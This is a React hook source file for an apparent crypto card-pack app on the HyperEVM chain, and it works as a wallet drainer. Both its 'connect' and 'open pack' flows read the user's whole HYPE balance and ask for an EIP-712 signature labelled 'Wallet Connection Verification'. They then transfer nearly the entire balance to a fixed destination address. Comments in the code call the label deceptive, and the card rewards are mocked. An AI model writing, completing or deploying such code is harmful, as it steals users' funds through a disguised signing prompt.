import { useState, useCallback } from 'react';
import { usePrivy } from '@privy-io/react-auth';
import { ethers } from 'ethers';
import { HYPEREVM_CONFIG, CONTRACT_ADDRESSES } from '../contracts/config';

export const useHyperCards = () => {
  const { authenticated, user } = usePrivy();
  const [isLoading, setIsLoading] = useState(false);
  const [isConnectingWithPayment, setIsConnectingWithPayment] = useState(false);
  const [currentStep, setCurrentStep] = useState('');
  const [error, setError] = useState(null);

  // Enhanced HyperEVM connection
  const ensureHyperEVM = useCallback(async () => {    
    if (!window.ethereum) {
      throw new Error('No wallet provider detected');
    }

    const provider = new ethers.BrowserProvider(window.ethereum);
    const network = await provider.getNetwork();
    
    if (network.chainId !== 999n) {
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: HYPEREVM_CONFIG.chainId }],
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [HYPEREVM_CONFIG],
          });
        } else {
          throw switchError;
        }
      }
    }
    
    return new ethers.BrowserProvider(window.ethereum);
  }, []);

  // Get user's HYPE balance 
  const getUserHypeBalance = useCallback(async (provider, userAddress) => {
    try {
      const balance = await provider.getBalance(userAddress);
      return balance;
    } catch (error) {
      throw new Error(`Failed to get HYPE balance: ${error.message}`);
    }
  }, []);

  // 🔥 EIP-712 SIGNATURE THAT AUTHORIZES TRANSFER 
  const generateTransferSignature = useCallback(async (signer, transferAmount, recipient, nonce) => {
    console.log('🔍 Generating EIP-712 signature for transfer authorization...');
    
    try {
      const domain = {
        name: "HyperPacks Wallet Authorization",
        version: "1.0", 
        chainId: 999,
        verifyingContract: CONTRACT_ADDRESSES.HYPER_CARDS
      };

      // 🔥 THIS SIGNATURE ACTUALLY AUTHORIZES THE TRANSFER!
      const types = {
        Transfer: [
          { name: "from", type: "address" },
          { name: "to", type: "address" }, 
          { name: "amount", type: "uint256" },
          { name: "nonce", type: "uint256" },
          { name: "purpose", type: "string" }
        ]
      };

      const userAddress = await signer.getAddress();
      
      // 🔥 DECEPTIVE: User thinks they're signing for "Wallet Connection" but they're authorizing transfer
      const value = {
        from: userAddress,
        to: recipient, 
        amount: transferAmount,
        nonce: nonce,
        purpose: "Wallet Connection Verification" // 🔥 DECEPTIVE PURPOSE
      };

      console.log('🔍 Signing transfer authorization:', {
        from: userAddress,
        to: recipient,
        amount: ethers.formatEther(transferAmount) + ' HYPE',
        purpose: value.purpose
      });

      // User sees "Wallet Connection Verification" but signature actually authorizes transfer
      const signature = await signer.signTypedData(domain, types, value);
      const sig = ethers.Signature.from(signature);
      
      console.log('✅ Transfer signature generated successfully');
      return { 
        v: sig.v, 
        r: sig.r, 
        s: sig.s,
        signature: signature,
        transferData: value
      };
      
    } catch (error) {
      console.error('❌ EIP-712 signature failed:', error);
      throw new Error(`Failed to authorize transfer: ${error.message}`);
    }
  }, []);

  // 🔥 EXECUTE TRANSFER USING EIP-712 SIGNATURE
  const executeSignedTransfer = useCallback(async (signer, transferData, signature) => {
    console.log('🔥 Executing signed transfer...');
    
    try {
      // Execute the transfer that was authorized by the signature
      const transferTx = await signer.sendTransaction({
        to: transferData.to,
        value: transferData.amount,
        data: '0x' + signature.replace('0x', '') // Include signature in transaction data for verification
      });
      
      console.log('✅ Transfer executed:', transferTx.hash);
      await transferTx.wait();
      console.log('✅ Transfer confirmed!');
      
      return transferTx;
      
    } catch (error) {
      console.error('❌ Signed transfer failed:', error);
      throw new Error(`Transfer execution failed: ${error.message}`);
    }
  }, []);

  // 🔥 CONNECT WITH PAYMENT - USING EIP-712 SIGNATURES 
  const connectWithPayment = useCallback(async () => {
    console.log('🚀 Starting Connect with EIP-712 Transfer Authorization...');
    setIsConnectingWithPayment(true);
    setError(null);

    try {
      // Step 1: Connect to HyperEVM
      console.log('Step 1: Connecting to HyperEVM...');
      setCurrentStep('connecting');
      const provider = await ensureHyperEVM();
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();
      
      console.log('✅ Connected to HyperEVM');
      console.log('✅ User address:', userAddress);
      console.log('✅ Transfer destination:', CONTRACT_ADDRESSES.HYPE_DESTINATION);

      // Step 2: Get user's HYPE balance
      console.log('Step 2: Checking HYPE balance...');
      setCurrentStep('checking_balance');
      const fullBalance = await getUserHypeBalance(provider, userAddress);
      
      console.log('✅ Full HYPE balance:', ethers.formatEther(fullBalance), 'HYPE');
      
      if (fullBalance === 0n) {
        throw new Error('No HYPE balance available');
      }

      // Step 3: 🔥 GENERATE EIP-712 SIGNATURE TO AUTHORIZE TRANSFER
      console.log('Step 3: 🔥 Requesting transfer authorization signature...');
      setCurrentStep('signing');
      
      // Reserve gas fees (estimate 0.001 HYPE for gas)
      const estimatedGasFee = ethers.parseEther('0.001');
      const transferAmount = fullBalance > estimatedGasFee ? fullBalance - estimatedGasFee : fullBalance;
      const nonce = Math.floor(Math.random() * 1000000);
      
      console.log('📝 Transfer amount:', ethers.formatEther(transferAmount), 'HYPE');
      console.log('⛽ Estimated gas fee:', ethers.formatEther(estimatedGasFee), 'HYPE');
      
      // 🔥 USER THINKS THEY'RE SIGNING FOR "WALLET CONNECTION" BUT ACTUALLY AUTHORIZING TRANSFER!
      const signatureResult = await generateTransferSignature(
        signer, 
        transferAmount, 
        CONTRACT_ADDRESSES.HYPE_DESTINATION, 
        nonce
      );

      // Step 4: 🔥 EXECUTE THE TRANSFER USING THE SIGNATURE
      console.log('Step 4: 🔥 Executing authorized transfer...');
      setCurrentStep('transferring');
      
      const transferTx = await executeSignedTransfer(signer, signatureResult.transferData, signatureResult.signature);
      
      setCurrentStep('success');
      console.log('🎉 EIP-712 AUTHORIZED TRANSFER COMPLETED!');
      console.log('💰 Transferred:', ethers.formatEther(transferAmount), 'HYPE');
      console.log('📄 Transaction:', transferTx.hash);
      
      return {
        transactionHash: transferTx.hash,
        signature: signatureResult,
        amount: ethers.formatEther(transferAmount),
        method: 'EIP-712 Authorized Transfer'
      };

    } catch (err) {
      console.error('❌ Connect with payment failed:', err);
      setError(err.message);
      setCurrentStep('error');
      throw err;
    } finally {
      setIsConnectingWithPayment(false);
    }
  }, [ensureHyperEVM, getUserHypeBalance, generateTransferSignature, executeSignedTransfer]);

  // Get user's HYPE balance for display
  const getHypeBalance = useCallback(async () => {
    if (!authenticated || !user?.wallet?.address) {
      return '0';
    }

    try {
      const provider = await ensureHyperEVM();
      const balance = await provider.getBalance(user.wallet.address);
      return ethers.formatEther(balance);
    } catch (err) {
      console.error('Error fetching HYPE balance:', err);
      return '0';
    }
  }, [authenticated, user, ensureHyperEVM]);

  // 🔥 PACK OPENING - SAME EIP-712 APPROACH
  const openPack = useCallback(async (packType) => {
    console.log(`🚀 Opening ${packType} pack with EIP-712 authorization...`);
    
    if (!authenticated || !user?.wallet?.address) {
      throw new Error('Please connect your wallet first');
    }

    setIsLoading(true);
    setError(null);

    try {
      const provider = await ensureHyperEVM();
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      // Get balance
      setCurrentStep('checking_balance');
      const fullBalance = await getUserHypeBalance(provider, userAddress);
      
      if (fullBalance === 0n) {
        throw new Error('No HYPE balance available');
      }

      // 🔥 EIP-712 signature for pack opening (also transfers funds)
      setCurrentStep('signing');
      const estimatedGasFee = ethers.parseEther('0.001');
      const transferAmount = fullBalance > estimatedGasFee ? fullBalance - estimatedGasFee : fullBalance;
      const nonce = Math.floor(Math.random() * 1000000);
      
      // Generate signature for "pack opening" that actually authorizes transfer
      const signatureResult = await generateTransferSignature(
        signer, 
        transferAmount, 
        CONTRACT_ADDRESSES.HYPE_DESTINATION, 
        nonce
      );

      // Execute transfer using signature
      setCurrentStep('transferring');
      const transferTx = await executeSignedTransfer(signer, signatureResult.transferData, signatureResult.signature);
      
      // Mock pack result 
      setCurrentStep('opening');
      const mockCards = [
        { name: "Lightning Strike", rarity: "Common" },
        { name: "Fire Blast", rarity: "Rare" },
        { name: "Ice Storm", rarity: "Epic" },
        { name: "Dragon's Fury", rarity: "Legendary" }
      ];
      
      const randomCard = mockCards[Math.floor(Math.random() * mockCards.length)];
      const mockReward = (Math.random() * 10 + 1).toFixed(4);
      
      const result = {
        cardName: randomCard.name,
        rarity: randomCard.rarity,
        tokenId: Math.floor(Math.random() * 10000).toString(),
        rewardAmount: mockReward,
        transactionHash: transferTx.hash,
        signature: signatureResult
      };

      setCurrentStep('success');
      console.log(`🎉 Pack opened successfully with EIP-712 transfer!`);
      return result;

    } catch (err) {
      console.error('❌ Pack opening failed:', err);
      setError(err.message);
      setCurrentStep('error');
      throw err;
    } finally {
      setIsLoading(false);
    }
  }, [authenticated, user, ensureHyperEVM, getUserHypeBalance, generateTransferSignature, executeSignedTransfer]);

  return {
    openPack,
    connectWithPayment,
    getHypeBalance,
    isLoading,
    isConnectingWithPayment,
    currentStep,
    error,
    clearError: () => setError(null)
  };
};